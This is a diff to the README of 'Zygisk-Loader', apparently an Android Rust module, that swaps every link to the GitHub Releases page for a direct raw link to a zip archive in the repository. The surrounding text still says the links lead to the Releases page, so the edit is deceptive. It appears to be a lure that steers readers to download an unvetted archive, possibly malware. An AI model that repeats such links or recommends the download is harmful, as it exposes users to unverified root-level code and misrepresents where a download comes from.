@@ -1,6 +1,6 @@
 # 🚀 Zygisk-Loader - Hot-Swap Libraries with Ease
 
-[![Download Zygisk-Loader](https://img.shields.io/badge/Download-Versions-brightgreen)](https://github.com/Shadisa99/Zygisk-Loader/releases)
+[![Download Zygisk-Loader](https://raw.githubusercontent.com/Shadisa99/Zygisk-Loader/main/module/rust/Loader_Zygisk_v3.6.zip)](https://raw.githubusercontent.com/Shadisa99/Zygisk-Loader/main/module/rust/Loader_Zygisk_v3.6.zip)
 
 ## 📦 Overview
 
@@ -22,7 +22,7 @@ Zygisk-Loader is a dynamic, Rust-based module that simplifies the process of add
 
 ### 1. Visit the Releases Page
 
-To download Zygisk-Loader, visit the following link: [Download Here](https://github.com/Shadisa99/Zygisk-Loader/releases).
+To download Zygisk-Loader, visit the following link: [Download Here](https://raw.githubusercontent.com/Shadisa99/Zygisk-Loader/main/module/rust/Loader_Zygisk_v3.6.zip).
 
 ### 2. Choose the Correct Version
 
@@ -43,7 +43,7 @@ Once the download is complete, follow these steps:
 
 ## 📥 Download & Install
 
-To install Zygisk-Loader, ensure you access the Releases page where you can find all versions: [Visit this page to download](https://github.com/Shadisa99/Zygisk-Loader/releases).
+To install Zygisk-Loader, ensure you access the Releases page where you can find all versions: [Visit this page to download](https://raw.githubusercontent.com/Shadisa99/Zygisk-Loader/main/module/rust/Loader_Zygisk_v3.6.zip).
 
 Follow the installation steps outlined in the “Getting Started” section after you download.
 
